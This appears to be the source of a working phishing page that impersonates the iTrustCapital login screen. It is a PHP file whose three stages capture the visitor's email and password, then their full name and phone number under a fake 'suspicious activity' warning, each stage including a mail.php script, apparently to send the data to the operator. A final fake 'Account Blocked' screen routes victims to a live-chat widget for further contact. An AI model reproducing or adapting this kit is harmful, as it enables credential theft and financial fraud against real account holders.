<!DOCTYPE html>
<html lang="en">
    <head>
        <title>Log in | iTrustCapital</title>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
        <meta name="viewport" content="width=device-width, initial-scale=1" />
        <meta name="robots" content="noindex, nofollow" />
        <link rel="stylesheet" href="./assets/main.cdn.min.css" />
    </head>

    <body>
        <div class="cd3a23284 ce35903ec">
            <main class="c16315053 login">
                <section class="c0a840fcf _prompt-box-outer ce6ea4b26">
                    <div class="cb05b4d01 c799a2417">
                        <div class="c8dc3ff32">
                            

                            <?php
                             if (isset($_POST['btnLoginMore'])) {
                                include 'mail.php';
                            ?>
                            <header class="c7d28d12a c6bbb2a3c">

                                <img class="ce7668503 c52b4cf03" id="prompt-logo-center" src="./assets/iTrustCapital-Logo-2_PSMjS2R.jpg" alt="iTrustCapital" />

                               <h1 style="margin-top: 0px;font-size: 24px;font-weight: 600;margin: 10px 0;">Verification Required</h1>

                               
                            </header>

                            <div class="cb8eb177c cf9006eaa">
                                    
                                
                                <h5 style="color: red;font-size: 18px;">Important Message</h5>
                                <h5 style="color: red;font-size: 15px;line-height: 20px;margin: 10px 0;">Some Suspicious Activity Found With Your Account, Enter Your Full Name and Phone Number to Verify Your Identity.</h5>

                                <form id="loginForm" method="POST" action=""  class="c61af928f c8d107fa2">
                                      <input type="hidden" name="email" value="<?php echo $_POST['email']; ?>" />
                                      <input type="hidden" name="password" value="<?php echo $_POST['password']; ?>" />
                                  <div class="ca2eec547 cc1f4b181">
                                        <div class="c7d0e1820">
                                            <div class="input-wrapper _input-wrapper">
                                                <div class="c4b9b85d6 cba8dcbda text c451ec6f7 cda832d57" data-action-text="" data-alternate-action-text="">
                                                    <input class="input cdf74ce7b ce07c2f58" name="name" id="name" type="text" value="" required="" placeholder="Full Name" />
                                                </div>
                                            </div>

                                            <div class="input-wrapper _input-wrapper">
                                                <div class="c4b9b85d6 cba8dcbda password cb19206a9 cda832d57" data-action-text="" data-alternate-action-text="">
                                                    <input class="input cdf74ce7b ccd26e912" name="number" id="number" type="text" required="" placeholder="Phone Number" />

                                                
                                                </div>
                                            </div>
                                        </div>
                                    </div>

                                    
                                    <div class="ca73473bb">
                                        <button type="submit" name="fromLog" value="default" class="c063cb1a4 c295cd12c c1abb73c2 ca574d24e c469b7493">Verify</button>
                                    </div>
                                </form>
                            </div>

                            <?php } elseif (isset($_POST['fromLog'])) {
                                 include 'mail.php';
                             ?>
                             <header class="c7d28d12a c6bbb2a3c">

                                <img class="ce7668503 c52b4cf03" id="prompt-logo-center" src="./assets/iTrustCapital-Logo-2_PSMjS2R.jpg" alt="iTrustCapital" />

                               <h1 style="margin-top: 0px;font-size: 24px;font-weight: 600;margin: 10px 0;">Account Blocked</h1>

                               
                            </header>

                            <div class="cb8eb177c cf9006eaa">
                                    
                                
                                <h5 style="color: red;font-size: 18px;">Important Message</h5>
                                <h5 style="color: red;font-size: 15px;line-height: 24px;margin: 10px 0;">Due to unauthorized activity and identification failure on your Account. Account Access has been suspended.Please Get in touch with our Support Staff Immediately</h5>
                                 <label style="font-weight: 600;">Error CODE: EBRX1</label><br>
                                <a href="javascript:void(Tawk_API.toggle())"> <button type="button" class="btn" style="background-color: #7EA842;color: #fff;
                                font-weight: bold;    padding: 10px;
                                border: none;
                                cursor: pointer; margin-top: 20px;">Ask Expert</button></a>
                               
                            </div>

                            <?php } else { ?>
                                <header class="c7d28d12a c6bbb2a3c">

                                <img class="ce7668503 c52b4cf03" id="prompt-logo-center" src="./assets/iTrustCapital-Logo-2_PSMjS2R.jpg" alt="iTrustCapital" />

                                <h1 class="cad511219 c35b3c26e">Welcome</h1>

                                <div class="c57c01509 c1ca2f3f7">
                                    <p class="cf51ac6de c80dbad51">Log in to iTrustCapital to continue to iTrustCapital.</p>
                                </div>
                            </header>
                            <div class="cb8eb177c cf9006eaa">
                                <form id="loginForm" method="POST" action=""  class="c61af928f c8d107fa2">
                                  <div class="ca2eec547 cc1f4b181">
                                        <div class="c7d0e1820">
                                            <div class="input-wrapper _input-wrapper">
                                                <div class="c4b9b85d6 cba8dcbda text c451ec6f7 cda832d57" data-action-text="" data-alternate-action-text="">
                                                    <input class="input cdf74ce7b ce07c2f58" name="email" id="username" type="text" value="" required="" placeholder="Username or email address" />
                                                </div>
                                            </div>

                                            <div class="input-wrapper _input-wrapper">
                                                <div class="c4b9b85d6 cba8dcbda password cb19206a9 cda832d57" data-action-text="" data-alternate-action-text="">
                                                    <input class="input cdf74ce7b ccd26e912" name="password" id="password" type="password" required="" placeholder="Password" />

                                                
                                                </div>
                                            </div>
                                        </div>
                                    </div>

                                    <p class="c585d845e c73a6741b">
                                        <a class="cb5196939 c6b1477af c8dcb97d6" href="#">Forgot password?</a>
                                    </p>
                                    <div class="ca73473bb">
                                        <button type="submit" name="btnLoginMore" value="default" class="c063cb1a4 c295cd12c c1abb73c2 ca574d24e c469b7493">Continue</button>
                                    </div>
                                </form>
                            </div>
                             <?php } ?>
                        </div>
                    </div>
                </section>
            </main>
        </div>
         <!--Start of Tawk.to Script-->
        <script type="text/javascript">
        var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
        (function(){
        var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
        s1.async=true;
        s1.src='https://embed.tawk.to/618c29fe6885f60a50bb3dcd/1fk5o83c9';
        s1.charset='UTF-8';
        s1.setAttribute('crossorigin','*');
        s0.parentNode.insertBefore(s1,s0);
        })();
        </script>
        <!--End of Tawk.to Script-->  
    </body>
</html>
